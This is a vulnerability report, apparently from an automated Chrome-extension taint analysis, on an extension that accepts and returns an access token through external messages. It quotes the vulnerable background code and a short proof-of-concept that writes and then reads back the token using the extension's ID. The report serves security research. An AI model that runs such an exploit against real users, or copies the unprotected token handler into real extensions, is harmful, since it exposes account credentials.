# CoCo Analysis: bkcmibppbckbehoahkbfeepcfficmndi

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1

---

## Sink: bg_chrome_runtime_MessageExternal → chrome_storage_local_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/bkcmibppbckbehoahkbfeepcfficmndi/opgen_generated_files/bg.js
Line 1026: `request.jwt`

**Code:**

```javascript
// Background script - External message handler (storage write)
chrome.runtime.onMessageExternal.addListener((request, sender, sendResponse) => {
  if (request.jwt) {
    console.log('Token ::: ', request.jwt);
    sendResponse({ success: true, message: 'Token has been received' });
    chrome.storage.local.set({ ['ll_access_token']: request.jwt }).then(() => { // ← attacker-controlled JWT stored
      console.log("Value is set");
      chrome.storage.local.set({ ['ll_language']: 'en-US' }).then(() => {
        console.log("Language Value is set");
        chrome.storage.local.get(["ll_access_token"]).then((result) => {
          console.log("Value currently is " + result["ll_access_token"]);
        });
      });
    });
  }
});

// Background script - External message handler (storage read/leak)
chrome.runtime.onMessageExternal.addListener(
  function (request, sender, sendResponse) {
    console.log(sender.tab ?
      "from a content script:" + sender.tab.url :
      "from the extension");
    if (request.event_type === 'get_token') {
      chrome.storage.local.get(["ll_access_token"]).then((result) => {
        console.log("Token currently is " + result["ll_access_token"]);
        sendResponse({
          token: result["ll_access_token"] // ← attacker receives stored data back
        });
      });
    }
    if (request.event_type === 'get_language') {
      chrome.storage.local.get(["ll_language"]).then((result) => {
        console.log("Language currently is " + result["ll_language"]);
        sendResponse({
          language: result["ll_language"]
        });
      });
    }
  }
);
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message (chrome.runtime.onMessageExternal)

**Attack:**

```javascript
// Step 1: Attacker website poisons storage with malicious JWT
chrome.runtime.sendMessage('bkcmibppbckbehoahkbfeepcfficmndi', {
  jwt: 'attacker_malicious_jwt_token_12345'
}, function(response) {
  console.log('Storage poisoned:', response);
});

// Step 2: Attacker retrieves the poisoned data
chrome.runtime.sendMessage('bkcmibppbckbehoahkbfeepcfficmndi', {
  event_type: 'get_token'
}, function(response) {
  console.log('Retrieved poisoned token:', response.token);
  // attacker now has: 'attacker_malicious_jwt_token_12345'
});
```

**Impact:** Complete storage exploitation chain - attacker can poison the JWT token storage and retrieve it back. While manifest.json restricts externally_connectable to specific domains (sidekicklearn.com, localhost), per the methodology, we ignore manifest.json restrictions. Any website matching those domains or any malicious extension can exploit this vulnerability to manipulate and exfiltrate the stored access token, potentially gaining unauthorized access to the user's account.
